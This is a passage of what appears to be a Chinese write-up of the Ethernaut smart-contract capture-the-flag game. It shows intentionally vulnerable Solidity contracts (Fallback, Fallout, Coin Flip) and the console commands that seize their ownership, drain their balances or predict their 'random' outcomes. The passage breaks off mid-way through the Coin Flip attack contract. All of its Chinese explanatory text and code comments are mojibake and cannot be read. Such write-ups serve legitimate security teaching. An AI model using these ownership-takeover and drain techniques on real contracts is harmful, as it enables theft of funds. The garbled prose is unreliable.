<li>Âú®ÊµèËßàÂô®ÁöÑÊéßÂà∂Âè∞ÂèØ‰ª•Êî∂Âà∞‰∏Ä‰∫õÊ∂àÊÅØÔºåÂÖ∂‰∏≠‰∏ÄÊù°‰∏∫Áé©ÂÆ∂Âú∞ÂùÄ<ul>
<li>ÂèØ‰ª•‰ΩøÁî® <code>player</code> ÂëΩ‰ª§ÈöèÊó∂Êü•ÁúãÁé©ÂÆ∂Âú∞ÂùÄÔºåMetaMask ‰πüÂèØ‰ª•Áõ¥Êé•Â§çÂà∂</li>
</ul>
</li>
<li>
<p>Êü•ÁúãÂΩìÂâç‰ΩôÈ¢ùÔºö<code>getBalance(player)</code></p>
<ul>
<li>
<p>Â¶ÇÊûúÊòæÁ§∫ <code>pending</code>ÔºåÂèØÊîπÁî® <code>await getBalance(player)</code> Êù•Ëé∑ÂæóÊ∏ÖÊô∞ÁöÑÁªìÊûú</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">getBalance</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
<span class="s2">&quot;0&quot;</span>
</code></pre></div>
</li>
</ul>
</li>
<li>
<p>Âú®ÊéßÂà∂Âè∞ËæìÂÖ• <code>ethernaut</code> Êü•ÁúãÊ∏∏ÊàèÁöÑ‰∏ªË¶ÅÂêàÁ∫¶</p>
<ul>
<li>ÂêàÁ∫¶ÁöÑ ABIÔºàApplication Binary InterfacesÔºâÊèê‰æõ‰∫ÜÊâÄÊúâ Ethernaut.sol ÁöÑÂÖ¨ÂºÄÊñπÊ≥ïÔºåÂ¶ÇÊâÄÊúâËÄÖÔºåÂèØÈÄöËøá <code>ethernaut.owner()</code> Êü•Áúã</li>
<li>Âπ∂‰∏çÈúÄË¶ÅÁõ¥Êé•‰∏é Ethernaut.sol ÂêàÁ∫¶‰∫§‰∫íÔºåËÄåÊòØÈÄöËøáÂÖ≥Âç°ÂÆû‰æã</li>
</ul>
</li>
<li>Ëé∑ÂèñÊµãËØïÁî®‰ª•Â§™Â∏ÅÁî®‰∫éÊîØ‰ªòÊ±ΩÊ≤πË¥πÔºö<a href="https://goerlifaucet.com/">1</a> / <a href="https://goerli-faucet.pk910.de/">2</a> / <a href="https://www.allthatnode.com/faucet/ethereum.dsrv">3</a> / <a href="https://goerlifaucet.org/">4</a></li>
<li>ÁÇπÂáª„ÄåGet new instance„ÄçÂπ∂Âú® MetaMask ÊéàÊùÉ‰∫§Êòì</li>
<li>
<p>Êü•ÁúãÂêàÁ∫¶‰ø°ÊÅØÂπ∂Ê†πÊçÆÊèêÁ§∫‰∫§‰∫í</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info</span><span class="p">()</span>
<span class="s2">&quot;You will find what you need in info1().&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info1</span><span class="p">()</span>
<span class="s2">&quot;Try info2(), but with \&quot;hello\&quot; as a parameter.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info2</span><span class="p">(</span><span class="s2">&quot;hello&quot;</span><span class="p">)</span>
<span class="s2">&quot;The property infoNum holds the number of the next info method to call.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">infoNum</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;negative&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;words&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="mf">42</span><span class="p">,</span>
<span class="w">    </span><span class="kc">null</span>
<span class="w">  </span><span class="p">],</span>
<span class="w">  </span><span class="s2">&quot;length&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;red&quot;</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span>
<span class="p">}</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info42</span><span class="p">()</span>
<span class="s2">&quot;theMethodName is the name of the next method.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">theMethodName</span><span class="p">()</span>
<span class="s2">&quot;The method name is method7123949.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">method7123949</span><span class="p">()</span>
<span class="s2">&quot;If you know the password, submit it to authenticate().&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">password</span><span class="p">()</span>
<span class="s2">&quot;ethernaut0&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">authenticate</span><span class="p">(</span><span class="s2">&quot;ethernaut0&quot;</span><span class="p">)</span>
<span class="c1">// MetaMask ÊéàÊùÉ‰∫§ÊòìÔºåÁ≠âÂæÖÁ°ÆËÆ§</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">getCleared</span><span class="p">()</span>
<span class="kc">true</span>
</code></pre></div>
</li>
<li>
<p>Êü•ÁúãÂêàÁ∫¶ÊâÄÊúâ ABIÔºö<code>contract.abi</code></p>
</li>
<li>ÂÆåÊàêÂêéÁÇπÂáª„ÄåSubmit instance„ÄçÈ™åËØÅ</li>
</ul>
<h2 id="1-fallback">1. Fallback<a class="headerlink" href="#1-fallback" title="Permanent link">&para;</a></h2>
<p>ÈòÖËØªÂêàÁ∫¶‰ª£Á†ÅÂπ∂ËææÊàê‰ª•‰∏ãÁõÆÊ†áÔºö</p>
<ol>
<li>Ëé∑ÂæóÂêàÁ∫¶ÁöÑÊâÄÊúâÊùÉ</li>
<li>Â∞ÜÂÖ∂‰ΩôÈ¢ùÂáè‰∏∫ 0</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="c1">// Arithmetic operations revert on underflow and overflow</span>
<span class="c1">// no need to use SafeMath after v0.8.0</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Fallback</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">contributions</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// ÊûÑÈÄ†ÂáΩÊï∞</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span><span class="w"> </span><span class="c1">// ÊâÄÊúâËÄÖ‰∏∫ÂΩìÂâçË∞ÉÁî®</span>
<span class="w">    </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span>
<span class="w">            </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span>
<span class="w">            </span><span class="s2">&quot;caller is not the owner&quot;</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span><span class="w">  </span><span class="c1">// only used inside a function modifier and it tells Solidity to execute the rest of the code.</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">contribute</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// msg.value - ÈöèÊ∂àÊÅØÂèëÈÄÅÁöÑ wei ÁöÑÊï∞Èáè</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0.001</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// ÊØèÊ¨°ËΩ¨Ë¥¶‰∏çËÉΩË∂ÖËøá 0.001 ‰ª•Â§™Â∏ÅÔºåÊÉ≥Ë¶ÅË∂ÖËøáÂéü owner ÁöÑ 1000 ‰ª•Â§™Â∏Å</span>
<span class="w">    </span><span class="c1">// ÈúÄË¶ÅÈáçÂ§çË∞ÉÁî®Â§öÊ¨° contribute ÂáΩÊï∞Ôºå‰∏îÊµãËØïË¥¶Êà∑‰πüÊ≤°ÊúâÈÇ£‰πàÂ§ö‰ª•Â§™Â∏ÅÔºåÊòæÁÑ∂‰∏çÂ§™Áé∞ÂÆû</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getContribution</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span><span class="w"> </span><span class="c1">// ÂêàÁ∫¶ÊâÄÊúâËÄÖÊâçËÉΩÂ∞ÜË¥¶Êà∑‰ΩôÈ¢ùÊ∏ÖÈõ∂</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// ‰∏Ä‰∏™ÂêàÁ∫¶ÊúÄÂ§öËÉΩÊúâ‰∏Ä‰∏™ receive ÂáΩÊï∞Ôºå‰∏çËÉΩÊúâÂèÇÊï∞ÂíåËøîÂõûÂÄº</span>
<span class="w">  </span><span class="c1">// ÂøÖÈ°ªÂ£∞Êòé external Âíå payable</span>
<span class="w">  </span><span class="c1">// ÂΩìË∞ÉÁî®ÂêàÁ∫¶ÁöÑ data Âüü‰∏∫Á©∫Êó∂ÔºåÂ∞Ü‰ºöÊâßË°åÔºõÂ¶ÇÊûúÊ≤°Êúâ receive ÂáΩÊï∞ÔºåÂ∞ÜÂ∞ùËØï fallback ÂáΩÊï∞</span>
<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Ê≥®ÊÑèÂà∞Ëã•ÂΩìÂâç‰∫§ÊòìËΩ¨Ë¥¶ÈáëÈ¢ùÂ§ß‰∫é 0 ‰∏îË∞ÉÁî®ËÄÖË¥°ÁåÆ‰∏ç‰∏∫ 0 Êó∂ÔºåÂèØ‰ª•ÈÄöËøá <code>receive</code> ÂáΩÊï∞ÂèñÂæóÂêàÁ∫¶ÊâÄÊúâÊùÉ</li>
<li>
<p>È¶ñÂÖàÈÄöËøá <code>contribute</code> ‰ΩøË¥°ÁåÆÂÄºÂ§ß‰∫é 0</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">contribute</span><span class="p">({</span><span class="nx">value</span><span class="o">:</span><span class="mf">1</span><span class="p">})</span>
</code></pre></div>
</li>
<li>
<p>ÂêëÂêàÁ∫¶ËΩ¨Ë¥¶Ëß¶Âèë <code>receive</code> ÂáΩÊï∞ÔºåÊâßË°åÂÆåÊàêÂêéÁ°ÆËÆ§‰∏Ä‰∏ãÊâÄÊúâËÄÖ</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
<span class="c1">// Êàñ</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="nx">value</span><span class="o">:</span><span class="mf">1</span><span class="p">})</span><span class="w">  </span><span class="c1">// ÂèëËµ∑‰∏Ä‰∏™‰∫§Êòì</span>

<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
</code></pre></div>
</li>
<li>
<p>Ê∏ÖÁ©∫ÂêàÁ∫¶Ë¥¶Êà∑ÁöÑ‰ΩôÈ¢ù</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">()</span>
</code></pre></div>
</li>
</ul>
<h3 id="_1">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=receive#receive-ether-function">Receive Ether Function</a></li>
<li><a href="https://web3js.readthedocs.io/en/v1.7.0/web3-eth.html?highlight=sendTransaction#sendtransaction">sendTransaction</a></li>
</ul>
<h2 id="2-fallout">2. Fallout<a class="headerlink" href="#2-fallout" title="Permanent link">&para;</a></h2>
<p>Â£∞ÊòéÂêàÁ∫¶ÁöÑÊâÄÊúâÊùÉ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Fallout</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">allocations</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="cm">/* constructor */</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">Fal1out</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="c1">// Âú® v0.4.22 ÂâçÔºåÊûÑÈÄ†ÂáΩÊï∞ÊòØÂíåÂêàÁ∫¶ÂêåÂêçÁöÑÂáΩÊï∞Ôºàv0.5.0 ÂºÉÁî®Ôºâ</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">require</span><span class="p">(</span>
<span class="w">                </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span>
<span class="w">                </span><span class="s2">&quot;caller is not the owner&quot;</span>
<span class="w">            </span><span class="p">);</span>
<span class="w">            </span><span class="nx">_</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">allocate</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">sendAllocation</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">allocator</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">allocator</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">collectAllocations</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">allocatorBalance</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">allocator</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>Ë¢´Ê≥®Èáä‰∏∫„ÄåÊûÑÈÄ†ÂáΩÊï∞„ÄçÁöÑÂáΩÊï∞Âêç‰∏∫ <code>Fal1out</code> ËÄå‰∏çÊòØ <code>Fallout</code> ÊÑèÂë≥ÁùÄËØ•ÂáΩÊï∞Âè™ÊòØÊôÆÈÄöÂáΩÊï∞ÂèØ‰ª•Ë¢´Ë∞ÉÁî®</p>
<ul>
<li>ÁúüÊ≠£ÁöÑÊûÑÈÄ†ÂáΩÊï∞Âè™Âú®ÂêàÁ∫¶ÂàõÂª∫Êó∂Ë∞ÉÁî®‰∏ÄÊ¨°</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">Fal1out</span><span class="p">()</span>
</code></pre></div>
<h3 id="_2">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p><a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=constructor#constructors">Constructors</a></p>
<h2 id="3-coin-flip">3. Coin Flip<a class="headerlink" href="#3-coin-flip" title="Permanent link">&para;</a></h2>
<p>ÈúÄË¶ÅËøûÁª≠ÁåúÂØπ 10 Ê¨°Êé∑Á°¨Â∏ÅÁöÑÁªìÊûú</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">consecutiveWins</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastHash</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// block.number - ÂΩìÂâçÂå∫ÂùóÂè∑</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">));</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">lastHash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">revert</span><span class="p">();</span><span class="w"> </span><span class="c1">// Êó†Êù°‰ª∂ÊäõÂá∫ÂºÇÂ∏∏</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">lastHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">FACTOR</span><span class="p">;</span><span class="w">  </span><span class="c1">// Âêë‰∏ãÂèñÊï¥</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">side</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>ÂÆûÈôÖ‰∏ä <code>side</code> ÁöÑÂÄºÂπ∂ÈùûÈöèÊú∫ÔºåÂå∫ÂùóÂè∑„ÄÅÂå∫ÂùóÂìàÂ∏åÁ≠âÈÉΩÊòØÂÖ¨ÂºÄÂèØËé∑ÂèñÁöÑ</li>
<li>ÂèØ‰ª•Áî±Âè¶‰∏Ä‰∏™ÂêàÁ∫¶ËÆ°ÁÆóÊé∑Á°¨Â∏ÅÁöÑÁªìÊûúÔºåÂπ∂Ë∞ÉÁî® <code>flip</code> ÂáΩÊï∞</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="c1">// ÊääÈúÄË¶ÅË∞ÉÁî®ÁöÑÂêàÁ∫¶ÊîæÂú®Âêå‰∏Ä‰∏™Êñá‰ª∂</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">consecutiveWins</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastHash</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

